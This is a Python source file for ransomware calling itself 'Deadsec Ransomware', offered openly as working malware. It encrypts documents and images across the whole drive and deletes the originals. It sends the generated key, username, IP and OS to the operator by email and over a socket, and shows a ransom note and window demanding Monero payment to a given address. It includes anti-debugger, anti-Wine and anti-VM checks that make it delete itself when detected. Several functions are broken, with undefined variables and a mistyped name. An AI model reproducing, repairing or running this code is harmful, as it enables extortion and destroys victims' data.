from base64 import *
import tkinter
from tkinter import * 
from tkinter import messagebox
import os,socket,time,string,binascii,codecs,sys,platform,ssl,smtplib,ssl,threading
from random import randint
from glob import glob
from random import choice
from hashlib import *
from subprocess import check_output

try:
	from Crypto.Util.Padding import pad, unpad
	from Crypto.Cipher import AES
	from Crypto import Random
	import rsa
except:
	if platform.system() == "Windows":
		os.system("py -m pip install pycrypto pycryptodome rsa Crypto wmi pywin")
	else:
		os.system("pip3 install pycrypto pycryptodome rsa Crypto ")
try:
	
	if platform.system() == "Windows":
		try:
			import wmi
			from winreg import *
		except:
			os.system("py -m pip install pycrypto pycryptodome rsa Crypto wmi pywin")
except Exception as helloworld:
	os.system("pip3 install pycrypto pycryptodome rsa Crypto ")

starting_path= os.path.dirname(os.path.realpath(__file__))
os_type = None

if __name__ != "__main__":
		print("Nice try but catch me if can !!!!")
		if platform.system() == "Windows":
			os.system("mshta vbscript:Execute('msgbox''Catch Me if you can !!!'':close')") 
			os.remove(sys.argv[0])
			sys.exit()
		else:
			os.system("zenity --error" + " --text='Catch m" +"e if you can !!!!' --title='LOLOLOLOLOL' ")
			os.remove(sys.argv[0])
			sys.exit()


def whoami():
	return os.getlogin()


def detect_os():
	while True:
		try:
			if platform.system() == "Windows":
				return "Windows"
			elif platform.system() == "Linux":
				return "Linux"
			else:
				return platform.system()
		except:
			sys.exit()


def anti_analysis():
	while True:
		try:
			# stage 1 wine detection
			if os_type == "Windows":
				try:
					aKey = r"SOFTWARE\\Wine"
					aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
					aKey = OpenKey(aReg, aKey)
					os.system("mshta vbscript:Execute('msgbox''Catch Me if you can !!!'':close')")
					os.remove(sys.argv[0])
					sys.exit()
				except:
					detected = 0
			# stage 2 detection with just scanning for files that running in the background
			try:
				if os_type == "Windows":
					detected = 0
					c = wmi.WMI()
					processes_List = ["ollydbg.exe", "ProcessHacker.exe", "tcpview.exe", "autoruns.exe","autorunsc.exe", "filemon.exe", "procmon.exe", "regmon.exe", "procexp.exe", "idaq.exe","idaq64.exe", "ImmunityDebugger.exe", "Wireshark.exe", "dumpcap.exe", "HookExplorer.exe", "ImportREC.exe", "PETools.exe", "LordPE.exe", "SysInspector.exe", "proc_analyzer.exe", "sysAnalyzer.exe","sniff_hit.exe","windbg.exe", "joeboxcontrol.exe", "joeboxserver.exe", "joeboxserver.exe","ResourceHacker.exe", "x32dbg.exe", "x64dbg.exe","Fiddler.exe", "httpdebugger.exe"]
					for process in c.win32_process():
						if process.Name in processes_List:
							detected = 1
							break
					if detection == 1:
						os.system("mshta vbscript:Execute('msgbox''Catch Me if you can !!!'':close')")
						os.remove(sys.argv[0])
					pass
			except:
				pass
			# stage 3 detection with getattr
			gettrace = getattr(sys, 'gettrace', None)
			if gettrace is None:
				if os_type == "Windows":
					os.system("mshta vbscript:Execute('msgbox''Catch Me if you can !!!'':close')")
					os.remove(sys.argv[0])
			elif gettrace():
				if os_type == "Windows":
					os.system("mshta vbscript:Execute('msgbox''Catch Me if you can !!!'':close')")
					os.remove(sys.argv[0])
				else:
					os.system("zenity --error --text='Catch me if you can !!!!' --title='LOLOLOLOLOL' ")
					os.remove(sys.argv[0])
			else:
				pass
		except:
			sys.exit()

def create_txt():
	if os_type == "Windows":
		os.chdir(f"C:/Users/{whoami()}/Desktop")
	else:
		if whoami() == "root":
			os.chdir("/root")
		else:
			os.chdir(f"/home/{whoami()}/Desktop/")

	with open("Deadsec_Ransomware_Readme.txt","w+") as f:
		f.write(""" All your files have been encrypted with no way of getting them back, you will have \n to pay 300 Euros in XMR on this address: 43f9EYcULHL6iNH5vh6JKe2NL8tMHpBKKfLciazcFaG8GG2FEfq1i22V7UpiFM8TE95QUr3PLYzURAGdyqZRhc8x4ofkAFL \n Next you have to email us on inf2021084@ionio.gr with a screenshot of the successful transaction and we will provide you the key.  \nDo NOT waste your time trying to find a way to decrypt them without a key or trying to find another way. It's a waste of time, consider yourself warned  """)

def anti_vm():#sudo dmidecode -s bios-version
	while True:
		try:
			if os_type == 'Windows' and len(check_output(["wmic","bios","get","smbiosbiosversion"])) <= 3:
				os.system("mshta vbscript:Execute('msgbox''Catch Me if you can !!!'':close')")
				os.remove(sys.argv[0])
			if os_type == 'Linux' and check_output("cat", "/sys/class/dmi/id/bios_version") == b'VirtualBox\n':
				os.system("zenity --error --text='Catch me if you can !!!!' --title='LOLOLOLOLOL' ")
				os.system("rm -rf  "+sys.argv[0])
		except:
			sys.exit()


def password_gen():
	password = ""
	char =  string.ascii_uppercase + string.ascii_lowercase + string.punctuation + string.digits
	for i in range(31):
		password = str(password + choice(char))
	mail(password)
	if len(sys.argv) > 1:
		socketm(password)
	passwd = (md5(password.encode())).hexdigest()
	if os_type == "Windows":
		path = "C:/Users/" + whoami() + "/AppData/Roaming/"
		os.chdir(path)
		with open("Windows_Error.log","w+") as fp:
			fp.write(passwd)
	if os_type == "Linux":
		if whoami() == 'root':
			path ="/root/.config/"
			os.chdir(path)
			with open("error.log","w+") as fp:
				fp.write(passwd)
		else:	 
			path = "/home/" + whoami() +"/.config/"
			os.chdir(path)
			with open("error.log","w+") as fp:
				fp.write(passwd)
	return passwd

def getpassword():
	if os_type == "Windows":
		path = "C:/Users/" + whoami() + "/AppData/Roaming/"
		os.chdir(path)
		with open("Windows_Error.log","r") as fp:
			return fp.read()
	if os_type == "Linux":
		if whoami() == "root":
			path ="/root/.config/error.log"
			with open(path,"r") as fp:
				return (fp.read()).strip()

		path = "/home/" + whoami() +"/.config/error.log"
		with open(path,"r") as fp:
			return (fp.read()).strip()

def mail(password):
	# give your email and password so it can be sended
	smtp_server = ""
	sender = ""
	sender_password = ""
	recipient = ""
	try:
		v_ip = check_output(["curl","-s","ifconfig.me"])
	except:
		v_ip = "ERROR"
	message =  f""" User: {whoami()} \n
				   Ip: {v_ip} \n
				   OS: {detect_os()} \n
				   File Recovery Password: {password}"""#

	SSL_context = ssl.create_default_context()
	with smtplib.SMTP(smtp_server + smtp_server2, 587) as server:
	    server.starttls(context=SSL_context)
	    server.login(sender + sender2 + sender3 + sender4 + sender5, sender_password + sender_password2)
	    server.sendmail(sender + sender2 + sender3 + sender4 + sender5, recipient1 + recipient2 + recipient3 + recipient4 + recipient5, message)

def socketm(password):
	public, private = rsa.newkeys(2048)
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ip = str(check_output(["curl","-s","ifconfig.me"]))
	try:
		ip2 = sys.argv[1]
		port = int(sys.argv[2])
		sock.connect((ip2, port))
		server_pk = rsa.PublicKey.load_pkcs1(sock.recv(2048))
	except Exception as error:
		print(error)
		pass

	try:
		string= f"""I am at your command master!!! \n  User: {whoami()} \n Ip: {ip} \n OS: {os_type} \n Recovery Password: {password} \n """
		message = rsa.encrypt(string.encode(), server_pk)
		sock.send(message)
		message = None
		string = None
		passwd = None
		sock.close()
	except Exception as error:
		print(error)
		pass

block_size = 32

def encrypt_all_files():
	if os_type == "Windows":
		for root, dirs, files in os.walk('C:/'):
			for file in files:
				if file.endswith(".jpg") or file.endswith(".png") or file.endswith(".jpg") or file.endswith(".gif") or file.endswith(".pdf") or file.endswith(".odt") or file.endswith(".word") or file.endswith(".txt") or file.endswith(".docx")  or file.endswith(".docs") or file.endswith(".docm") or file.endswith(".docb") or file.endswith(".dotx") or file.endswith(".dotm") or file.endswith(".wwl") or file.endswith(".wll"):
					file_path = os.path.join(root, file)
					input_file = os.path.join(root, file)
					output_file = os.path.join(root, file + '.enc'+'ry'+'pt'+'ed')
					passwd = getpassword()
					try:
						with open(input_file, 'rb') as f_input:
							data = f_input.read()
							cipher = AES.new(bytes(passwd, 'utf-8'), AES.MODE_ECB)
							ciphertext = cipher.encrypt(pad(data, AES.block_size))
						with open(output_file, 'wb') as f_output:
							f_output.write(ciphertext)
						os.remove(input_file)
					except Exception as e:
						pass

	if os_type == "Linux":
		for root, dirs, files in os.walk('/'):
			for file in files:
				if file.endswith(".jpg") or file.endswith(".png") or file.endswith(".gif") or file.endswith(".jpg") or file.endswith(".pdf") or file.endswith(".odt") or file.endswith(".word") or file.endswith(".txt") or file.endswith(".docs") or file.endswith(".docx")  or file.endswith(".docm") or file.endswith(".docb") or file.endswith(".dotx") or file.endswith(".dotm") or file.endswith(".wwl") or file.endswith(".wll"):
					file_path = os.path.join(root, file)
					input_file = os.path.join(root, file)
					output_file = os.path.join(root, file + '.enc'+'ry'+'pt'+'ed')
					passwd = getpassword()
					try:
						with open(input_file, 'rb') as f_input:
							data = f_input.read()
							cipher = AES.new(bytes(passwd, 'utf-8'), AES.MODE_ECB)
							ciphertext = cipher.encrypt(pad(data, AES.block_size))
						with open(output_file, 'wb') as f_output:
							f_output.write(ciphertext)
						os.remove(input_file)
					except Exception as e:
						pass
                        

def decrypt_all_files():
	passwd = getpassword()
	if os_type == "Windows":
		for root, dirs, files in os.walk('C:/'):
			for file in files:
				if file.endswith('.e'+'nc'+'ryp'+'ted'):
					file_path = os.path.join(root, file)
					input_file = os.path.join(root, file)
					output_file = os.path.join(root, os.path.splitext(file)[0])
					try:
						with open(input_file, 'rb') as f_input:
							ciphertext = f_input.read()
							cipher = AES.new(bytes(passwd, 'utf-8'), AES.MODE_ECB)
							data = unpad(cipher.decrypt(ciphertext), AES.block_size)
						with open(output_file, 'wb') as f_output:
							f_output.write(data)
						os.remove(input_file)
					except Exception as e:
						pass
                        
	if os_type == "Linux":
		for root, dirs, files in os.walk('/'):
			for file in files:
				if file.endswith('.en'+'cr'+'yp'+'te'+'d'):
					file_path = os.path.join(root, file)
					input_file = os.path.join(root, file)
					output_file = os.path.join(root, os.path.splitext(file)[0])
					try:
						with open(input_file, 'rb') as f_input:
							ciphertext = f_input.read()
							cipher = AES.new(bytes(passwd, 'utf-8'), AES.MODE_ECB)
							data = unpad(cipher.decrypt(ciphertext), AES.block_size)
						with open(output_file, 'wb') as f_output:
							f_output.write(data)
						os.remove(input_file)
					except Exception as e:
						pass


def anti_catcher():
	while True:
		anti_analysis()
		anti_vm()
		time.sleep(60)

def wrong_key():
	return messagebox.showwarning("Invalid Key", "You are making your position difficult here.")

def gui_message():
	def onclick():
		data = entry.get()
		key = (getpassword()).encode()
		if key == md5(data.encode()).hexdigest().encode():
			decrypt_all_files()
			messagebox.showinfo("Files Restored", "Nicely done thank you for you cooperation")
			os.remove(starting_path+sys.argv[0])
			sys.exit()
		else:
			wrong_key()

	root = tkinter.Tk()
	root.geometry("700x300")
	root.resizable(0, 0)
	root.title("Oops Your files have been encr"+"ypted")
	label = tkinter.Label(root, text="""All your documents and images have been encrypted by Deadsec Ransomware !!! \n You will have to pay 300 Euros in monero coin (XMR) to take them back \nXMR Address: 43f9EYcULHL6iNH5vh6JKe2NL8tMHpBKKfLciazcFaG8GG2FE\nfq1i22V7UpiFM8TE95QUr3PLYzURAGdyqZRhc8x4ofkAFL \n Contact Us: inf2021084@ionio.gr""")
	label.pack()
	entry = tkinter.Entry(width=50)
	entry.pack()
	button = tkinter.Button(root, text="Enter", command=onclick)
	button.pack(side='bottom')
	root.mainloop() 



if __name__ == "__main__":
	os_type = str(detect_os())
	#anti_catcher_background_check = threading.Thread(target=anti_catcher, args=(0, ))
	#anti_catcher_background_check.start()
	if os_type == "Windows" and os.path.isfile("C:/Users/" + whoami() + "/AppData/Roaming/Windows_Error.log"):
		gui_message()
		sys.exit()
	if os_type == "Linux" and (os.path.isfile("/home/"+whoami()+"/.config/error.log") or os.path.isfile("/" + whoami() + "/.config/error.log")):
		gui_message()
		sys.exit()
	password_gen()
	encrypt_all_files()
	create_txt()
	gui_message()
